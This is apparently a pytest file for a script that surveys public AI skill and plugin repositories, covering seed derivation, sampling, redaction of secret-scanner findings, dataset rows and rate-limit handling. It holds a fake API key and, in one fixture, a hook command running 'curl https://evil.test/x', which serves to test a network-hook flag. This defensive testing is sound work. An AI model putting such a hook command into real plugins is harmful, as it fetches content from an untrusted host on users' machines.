"""Tests for the pure parts of scripts/run_month.py. No network, no clones, no scanners."""
import collections
import json
import os
import random
import sys

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "scripts"))
import run_month as rm  # noqa: E402

FAKE_SECRET = "sk-live-9f8e7d6c5b4a39281706f5e4d3c2b1a0ZZ"


# seed derivation

def test_seed_is_first_of_month():
    assert rm.derive_seed("2026-11") == 20261101
    assert rm.derive_seed("2027-01") == 20270101


def test_seeds_differ_by_month():
    seeds = {rm.derive_seed(f"2027-{m:02d}") for m in range(1, 13)}
    assert len(seeds) == 12


@pytest.mark.parametrize("bad", ["2026-13", "2026-00", "26-11", "2026-1", "2026/11", "", None, "2026-11-01"])
def test_bad_month_rejected(bad):
    with pytest.raises(ValueError):
        rm.derive_seed(bad)


# sampling

def items(n, kinds=("skill",)):
    out = []
    for i in range(n):
        for k in kinds:
            out.append({"kind": k, "repo": f"owner{i % 37}/repo{i}", "owner": f"owner{i % 37}", "fork": False})
    return out


def test_sampling_is_deterministic_and_order_independent():
    a = items(500, ("skill", "plugin"))
    b = list(a)
    random.Random(1).shuffle(b)
    assert rm.draw_sample(a, 50, 20261101) == rm.draw_sample(b, 50, 20261101)


def test_sampling_changes_with_seed():
    a = items(500)
    assert rm.draw_sample(a, 50, 20261101)[1] != rm.draw_sample(a, 50, 20261201)[1]


def test_sampling_excludes_forks_and_author_and_merges_kinds():
    a = items(10, ("skill", "plugin"))
    a.append({"kind": "skill", "repo": "x/forked", "owner": "x", "fork": True})
    a.append({"kind": "skill", "repo": "BasitAliSandhu/own", "owner": "BasitAliSandhu", "fork": False})
    pool, picked = rm.draw_sample(a, 100, 1)
    assert pool == 10
    repos = [r for r, _ in picked]
    assert "x/forked" not in repos and "BasitAliSandhu/own" not in repos
    assert all(k == ["plugin", "skill"] for _, k in picked)
    assert repos == sorted(repos)


def test_sample_size_capped_by_pool():
    pool, picked = rm.draw_sample(items(20), 3000, 5)
    assert pool == 20 and len(picked) == 20


def test_sampling_matches_first_edition_method():
    """Same draw as draw_sample.py: random.seed(SEED); random.sample(sorted(pool), N)."""
    a = items(300)
    pool = sorted({x["repo"] for x in a})
    random.seed(20261013)
    expected = sorted(random.sample(pool, 40))
    assert [r for r, _ in rm.draw_sample(a, 40, 20261013)[1]] == expected


# secret-count reduction

def ssg_result():
    return {"tool": "skill-scan-gate", "version": "0.2.0", "root": "/tmp/work/repos/a__b", "filesScanned": 3,
            "summary": {"total": 5},
            "findings": [
                {"rule": "SSG502", "file": "skills/x/SKILL.md", "line": 6, "evidence": f"token: {FAKE_SECRET}",
                 "fingerprint": "2e10ffd417af77450da84aa2"},
                {"rule": "SSG503", "file": "a.md", "line": 2, "evidence": FAKE_SECRET[:12] + "<redacted>", "fingerprint": "f1"},
                {"rule": "SSG503", "file": "b.md", "line": 3, "evidence": "password=" + FAKE_SECRET, "fingerprint": "f2"},
                {"rule": "SSG203", "file": "c.md", "line": 4, "evidence": "eyJ" + FAKE_SECRET, "fingerprint": "f3"},
                {"rule": "SSG607", "file": "skills/x/SKILL.md", "line": 4, "evidence": "allowed-tools: Bash", "fingerprint": "f4"},
            ]}


def test_secret_reduction_counts():
    public, counts = rm.reduce_secret_findings(ssg_result())
    assert counts == collections.Counter({"SSG503": 2, "SSG502": 1, "SSG203": 1})
    assert [f["rule"] for f in public["findings"]] == ["SSG607"]


def test_secret_reduction_never_retains_values():
    public, counts = rm.reduce_secret_findings(ssg_result())
    dumped = json.dumps(public) + json.dumps(counts)
    for needle in (FAKE_SECRET, FAKE_SECRET[:12], "redacted", "fingerprint", "evidence", "2e10ffd4", "c.md", "b.md"):
        assert needle not in dumped
    # nothing of the private findings survives, not even file names or lines
    assert all(set(f) == {"rule", "file", "line"} for f in public["findings"])


def test_secret_reduction_leaves_input_untouched_and_handles_errors():
    r = ssg_result()
    before = json.dumps(r, sort_keys=True)
    rm.reduce_secret_findings(r)
    assert json.dumps(r, sort_keys=True) == before
    pub, c = rm.reduce_secret_findings({"_error": "TimeoutExpired"})
    assert pub["findings"] == [] and not c and pub["_error"] == "TimeoutExpired"
    pub, c = rm.reduce_secret_findings(None)
    assert "_error" in pub and not c


def test_secret_aggregate():
    per = [collections.Counter({"SSG503": 3}), collections.Counter({"SSG501": 1, "SSG203": 2}), collections.Counter()]
    rows = {r[0]: r[1:] for r in rm.secret_aggregate(per, 3)}
    assert rows["SSG503"] == [3, 1, 3]
    assert rows["SSG203"] == [2, 1, 3]
    assert rows["any of SSG405/SSG501/SSG502/SSG503"] == [4, 2, 3]


# aggregation into a dataset row

def scan_record():
    public, counts = rm.reduce_secret_findings(ssg_result())
    return {"fetched": {"repo": "a/b", "sha": "abc123", "files": 3, "bytes": 999}, "ssg": public, "secret_counts": dict(counts),
            "desc_lint": {"skills": [{"file": "skills/x/SKILL.md", "findings": [{"rule": "description-too-long"}]}]},
            "portability": {"findings": [{"rule": "x"}]},
            "inventory": {"hooks": [{"command": "curl https://evil.test/x", "file": "hooks/hooks.json"}],
                          "mcp_servers": [{"type": "stdio", "command": "npx"}, {"type": "http", "command": ""}]},
            "yaml": [{"yaml": "reject", "desc_len": None, "broad_when": False, "has_desc": False},
                     {"yaml": "ok", "desc_len": 2000, "broad_when": True, "has_desc": True}],
            "hook_scripts_net": [], "mcplint": {"lists": 1, "tools": 4, "dialect": 2, "no_annotations": 4},
            "present": {"plugin.json": True, "marketplace.json": False, "server.json": False, ".mcp.json": True, "hooks.json": True}}


def test_build_row_matches_first_edition_columns():
    import csv
    first = os.path.join(rm.DATA, "2026-10", "dataset.csv")
    with open(first, newline="", encoding="utf-8") as f:
        columns = next(csv.reader(f))
    row = rm.build_row(scan_record(), {"stargazerCount": 5, "owner": {"__typename": "User"}}, ["skill"])
    assert list(row) == columns


def test_build_row_values_and_no_secret_columns():
    row = rm.build_row(scan_record(), {"stargazerCount": 5}, ["skill", "plugin"])
    assert row["any_unrestricted_bash"] and row["SSG607"] == 1
    assert row["n_skill_yaml_reject"] == 1 and row["n_skill_desc_over_1024"] == 1 and row["any_desc_over_1024"]
    assert row["n_mcp_servers"] == 2 and row["n_mcp_stdio"] == 1
    assert row["hook_network_flag"] is True and row["hook_network_review"] == ""
    assert row["ssg_total_public_rules"] == 1
    assert row["found_by"] == "plugin;skill"
    assert not any(r in k for k in row for r in rm.PRIVATE_RULES)
    assert FAKE_SECRET not in json.dumps(row)


# trend

def stats(n=100):
    return {"repos": n, "repos_with_skills": 80, "repos_with_stdio_mcp": 10, "repos_with_hooks": 5, "skill_md_total": 900,
            "no_security_md": f"80/{n} (80.0%)", "unpinned_mcp": "4/10 (40.0%)", "unpinned_mcp_latest": "1/10 (10.0%)",
            "no_licence_file": f"30/{n} (30.0%)", "unrestricted_bash_repos": "12/80 (15.0%)",
            "yaml_reject_repos": "8/80 (10.0%)", "no_front_matter_repos": "9/80 (11.2%)",
            "desc_over_1024_repos": "4/80 (5.0%)", "hook_flag_in_hook_repos": "1/5 (20.0%)"}


def test_trend_row_and_upsert(tmp_path):
    p = str(tmp_path / "trend.csv")
    rm.upsert_trend(p, rm.trend_row("2026-12", stats(), {"seed": 20261201}))
    rm.upsert_trend(p, rm.trend_row("2026-11", stats(), {"seed": 20261101}))
    rm.upsert_trend(p, rm.trend_row("2026-12", stats(120), {"seed": 20261201}))
    rows = rm.read_trend(p)
    assert [r["month"] for r in rows] == ["2026-11", "2026-12"]
    assert rows[1]["repos"] == "120" and rows[1]["no_security_md"] == "80" and rows[1]["no_licence_file_pct"] == "30.0"
    assert rows[0]["precision"] == rm.PRECISION_NOTE
    assert list(rows[0]) == rm.TREND_FIELDS


def test_first_edition_trend_row_matches_stats():
    s = json.load(open(os.path.join(rm.DATA, "2026-10", "stats.json"), encoding="utf-8"))
    row = [r for r in rm.read_trend(os.path.join(rm.DATA, "trend.csv")) if r["month"] == "2026-10"][0]
    built = rm.trend_row("2026-10", s, {})
    for k in ("repos", "no_security_md", "no_security_md_pct", "unpinned_mcp", "yaml_reject_repos_pct"):
        assert float(row[k]) == float(built[k])


# telling a rate limit from a refusal

def test_rate_limit_is_waited_out():
    assert rm.is_rate_limited(429, {})
    assert rm.is_rate_limited(403, {"X-RateLimit-Remaining": "0"})
    assert rm.is_rate_limited(403, {"Retry-After": "60"})


def test_refusal_is_not_a_rate_limit():
    assert not rm.is_rate_limited(403, {"X-RateLimit-Remaining": "9"})
    assert not rm.is_rate_limited(403, {})
    assert not rm.is_rate_limited(403, None)
    assert not rm.is_rate_limited(422, {"X-RateLimit-Remaining": "0"})


class _FakeSearch:
    def __init__(self, pages):
        self.pages = pages

    def search_code(self, q, page):
        return self.pages.get(page)


def test_search_rejected_on_first_page_stops_the_run():
    with pytest.raises(SystemExit):
        rm.search(_FakeSearch({}), [("skill", "filename:SKILL.md size:0..300", 3)])


def test_search_past_the_result_window_is_not_an_error():
    item = {"repository": {"full_name": "o/r", "fork": False, "owner": {"login": "o"}}}
    gh = _FakeSearch({1: {"total_count": 200, "items": [item] * 100}})
    items, log = rm.search(gh, [("skill", "filename:SKILL.md size:0..300", 3)])
    assert len(items) == 100
    assert log[-1]["note"] == "beyond result window"
